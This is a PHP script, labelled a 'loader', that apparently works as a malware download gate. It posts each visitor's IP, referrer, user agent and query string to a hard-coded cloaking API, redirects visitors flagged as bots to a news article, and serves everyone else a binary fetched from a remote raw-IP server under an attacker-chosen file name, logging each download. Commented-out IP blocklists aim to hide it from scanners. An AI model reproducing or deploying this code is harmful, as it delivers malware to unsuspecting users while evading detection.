<?php 
	
	$REQUEST_URI = $_SERVER['REQUEST_URI'];

	if( empty($REQUEST_URI) ){
		exit('REQUEST_URI');
	}

	$REQUEST_URI_ARR = explode("/", $REQUEST_URI);

	if( count($REQUEST_URI_ARR) != 3 ){
		exit('REQUEST_URI_ARR');
	}

	$_GET['e'] = $REQUEST_URI_ARR[2];

	if( $_GET['e'] != '123.zip' ){

	$version = '151120'; $sourceid = ''; if (in_array ('curl', get_loaded_extensions())) {} else {echo 'Install CURL on server'; die;} $domain = 'zoeC7IuaBoU3Nwj.Pa2'; $domains = 'mzmM77gwI'; $flowdomain = 'f271171'; $cloudipprotocol = 'http://'; $cloudipphp = '/apipost.php'; $cloudip = '104.193.252.21'; $codenamemode = 'API'; @$_SERVER['HTTP_ACCEPT_LANGUAGE'] = $_SERVER['HTTP_ACCEPT_LANGUAGE']; if (!function_exists('getRealIpAddrAF')){ function getRealIpAddrAF() { if ((!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) && (($_SERVER['HTTP_CF_CONNECTING_IP'])!='127.0.0.1') && (($_SERVER['HTTP_CF_CONNECTING_IP'])!=($_SERVER['SERVER_ADDR']))) {$ip=$_SERVER['HTTP_CF_CONNECTING_IP'];} elseif ((!empty($_SERVER['GEOIP_ADDR'])) && (($_SERVER['GEOIP_ADDR'])!='127.0.0.1')) {$ip=$_SERVER['GEOIP_ADDR'];} elseif ((!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) && (($_SERVER['HTTP_X_FORWARDED_FOR'])!='127.0.0.1') && (($_SERVER['HTTP_X_FORWARDED_FOR'])!=($_SERVER['SERVER_ADDR']))) {$ip=explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0];} elseif ((!empty($_SERVER['HTTP_CLIENT_IP'])) && (($_SERVER['HTTP_CLIENT_IP'])!='127.0.0.1') && (($_SERVER['HTTP_CLIENT_IP'])!=($_SERVER['SERVER_ADDR']))) {$ip=$_SERVER['HTTP_CLIENT_IP'];} else {$ip=$_SERVER['REMOTE_ADDR'];} return $ip; }}$ip=getRealIpAddrAF(); if (!function_exists('getRealref')){ function getRealref() { if(empty($_SERVER['HTTP_REFERER'])) { $_SERVER['HTTP_REFERER'] = getenv('HTTP_REFERER'); } return $_SERVER['HTTP_REFERER']; }} $ref=getRealref(); if (!function_exists('getRealua')){function getRealua() { if(empty($_SERVER['HTTP_USER_AGENT'])) { $_SERVER['HTTP_USER_AGENT'] = getenv('HTTP_USER_AGENT'); } return $_SERVER['HTTP_USER_AGENT']; }} $ua=getRealua(); if ($_SERVER['QUERY_STRING']!=''){ $data = ''.urlencode($_SERVER['QUERY_STRING']).''; } else {$data = '';} $langua = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, ''.$cloudipprotocol.''.$cloudip.''.$cloudipphp.''); curl_setopt($ch, CURLOPT_RETURNTRANSFER,true); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, 'fd='.$flowdomain.'&ip='.$ip.'&ref='.$ref.'&ua='.$ua.'&data='.$data.'&sourceid='.$sourceid.'&langua='.$langua.''); $ifbot = curl_exec($ch); curl_close($ch); 
		if ($ifbot != '0') {

			header("HTTP/1.1 301 Moved Permanently"); 
			http_response_code(301);
			header("Location: https://www.nytimes.com/es/2020/12/07/espanol/estados-unidos/separacion-familiar.html");

			exit;

		 // header('HTTP/1.1 404 Not Found'); 
		 // exit('<h1>Not Found</h1>The requested URL '.$_SERVER['REQUEST_URI'].' was not found on this server.'); 

		} else { echo ''; } 

	}

	function getRealIpAddr()
	{
	    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
	    {
	      $ip=$_SERVER['HTTP_CLIENT_IP'];
	    }
	    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
	    {
	      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
	    }
	    else
	    {
	      $ip=$_SERVER['REMOTE_ADDR'];
	    }
	    return $ip;
	}

	//>> check network ip addr
	/*
	$network_black_list_fp = __DIR__ . '/network_black_list.txt';
	$network_black_list = @file_get_contents( $network_black_list_fp );

	$ip_addr = getRealIpAddr();

	if( !empty( $ip_addr ) && empty( $_GET['ip'] ) && $_GET['e'] != '123.zip' 
		&& !empty( $network_black_list )
	){

		$ip_addr_arr = explode('.', $ip_addr);

		if( count( $ip_addr_arr ) == 4 ){

			unset($ip_addr_arr[3]);

			$ip_network = implode('.', $ip_addr_arr);

			if( stripos( $network_black_list , $ip_network ) !== false ){
				exit("DONE IP..");
			}

		}

	}
	*/
	
	//<< check network ip addr

	//>> check ip addr
	/*
	$black_list_fp = __DIR__ . '/black_list.txt';
	$black_list = @file_get_contents( $black_list_fp );

	$ip_addr = getRealIpAddr();

	if( !empty( $ip_addr ) && empty( $_GET['ip'] ) && $_GET['e'] != '123.zip' ){

		if( stripos( $black_list, $ip_addr) !== false ){
			exit("DONE IP.");
		}

	}
	*/
	//<< check ip addr

	$links = [
		'http://162.241.127.123/router08.php',
	];

	shuffle($links);

	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename=' . $_GET['e']); 
	header('Content-Transfer-Encoding: binary');
	header('Connection: Keep-Alive');
	header('Expires: 0');
	header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
	header('Pragma: public');

	file_put_contents( 
		__DIR__ . '/../try__big__stat.txt',
		date('c') . "\t" . getRealIpAddr() . "\t" . $_SERVER['HTTP_USER_AGENT'] . "\t". $_GET['e'] . "\r\n",
		FILE_APPEND
	);

	$outfilepath = __DIR__ . '/../big__stat.txt';

	foreach ($links as $link) {

		$ctx = stream_context_create(array('http'=>
		    array(
		        'timeout' => 30,
		    )
		));

		$data = file_get_contents( $link , false, $ctx);

		if( strlen($data) < 10000 ){
			continue;
		}

		file_put_contents( 
			$outfilepath,
			date('c') . "\t" . getRealIpAddr() . "\t" . $_SERVER['HTTP_USER_AGENT'] . "\t". $_GET['e'] . "\r\n",
			FILE_APPEND
		);

		echo $data;

		break;
	}

	//<< loader